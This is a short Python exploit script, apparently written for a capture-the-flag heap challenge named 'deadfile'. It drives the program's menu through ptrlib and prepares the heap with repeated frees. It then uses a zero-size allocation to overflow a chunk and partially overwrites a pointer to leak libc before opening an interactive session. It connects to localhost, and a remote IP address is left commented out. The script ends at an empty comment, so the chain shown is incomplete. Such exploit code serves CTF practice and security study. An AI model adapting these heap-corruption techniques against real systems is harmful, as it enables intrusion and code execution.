from ptrlib import *

def new(size):
    sock.sendlineafter(">> ", "1")
    sock.sendlineafter(": ", str(size))
    return
def delete(index):
    sock.sendlineafter(">> ", "2")
    sock.sendlineafter(": ", str(index))
    return
def register(name):
    sock.sendlineafter(">> ", "7")
    sock.sendafter(": ", name)
    return

def fopen(filepath):
    sock.sendlineafter(">> ", "3")
    sock.sendafter(": ", filepath)
    return

def read(index, offset, data=None):
    sock.sendlineafter(">> ", "4")
    sock.sendlineafter(": ", str(index))
    sock.sendlineafter(": ", str(offset))
    if data is not None:
        sock.send(data)
    return

#sock = Process("./deadfile")
sock = Socket("localhost", 9999)
#sock = Socket("115.68.235.72", 33445)

# prepare
new(0x18) # 0
new(0x88) # 1
new(0x88) # 2
for i in range(7):
    delete(2)
delete(1)
for i in range(3):
    delete(0)

# libc leak
register(b'\x80')
new(0x18) # 3
new(0x18) # 4: target
new(0x98) # 5
new(0x98) # 6
new(0x98) # 7
new(0) # overflow: 2
delete(0)
read(2, 0, b'\x60\x07\xdd')
new(0x18)

# 

sock.interactive()
